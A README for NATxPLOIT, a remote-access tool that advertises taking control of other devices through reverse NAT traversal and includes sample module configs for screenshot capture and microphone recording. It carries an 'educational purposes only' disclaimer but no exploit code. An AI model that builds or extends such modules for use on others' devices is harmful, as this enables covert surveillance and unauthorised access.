# NATxPLOIT v1.0
<h3>FOR EDUCATIONAL PURPOSES ONLY</h3>

Take control of other devices using Reverse NAT Traversal

## BY USING THIS SOFTWARE YOU AGREE TO THE FOLLOWING
THE DEVELOPER OF THIS SOFWARE IS NOT RESPONSIBLE FOR ANY ILLEGAL ACTIVITY PERFORMED BY ANY USER.

<img src="https://i.ibb.co/43RCdSG/Captura-de-ecr-2025-04-18-224103.png" width="70%">


## Features

* Generate payloads to control other devices.
* Inject scripts after device connection is established.
* Instant terminal access directly from the application.
* Create your own modules to execute with a single click.


## How to Install

| Exe    | Description | Releases |
| -------- | ------- | ------- |
| <a href="https://github.com/NxRoot/NATxPLOIT/releases"><img style="min-width: 40px;min-height: 40px; width: 40px;" src="https://i.ibb.co/53CzcMg/natxploit-2.png"/></a> | Download the latest version   | [Download](https://github.com/NxRoot/NATxPLOIT/releases)    |

## How to create your own modules
* Modules must be placed inside the `scripts` folder:
<img src="https://i.ibb.co/GfBYqCXk/Captura-de-ecr-2025-04-18-232832.png"/>

* Modules must contain a `run.json` configuration file:
```jsx
{
    "name": "Screenshot",   // Name that shows up on UI
    "runner": "scrn.exe",   // File to be executed
    "ui": "ui.js"           // UI to handle response
}
``` 

* Modules can have nested options to specify execution arguments:
```jsx
{
    "name": "Microphone",
    "runner": "rec.exe",
    "ui": "ui.js",
    "options": [
        { "label": "5 Seconds", "args": "5" },
        { "label": "10 Seconds", "args": "10" },
        { "label": "20 Seconds", "args": "20" },
        { "label": "30 Seconds", "args": "30" }
    ]
}
```

## &nbsp;
⭐ If you find this useful!
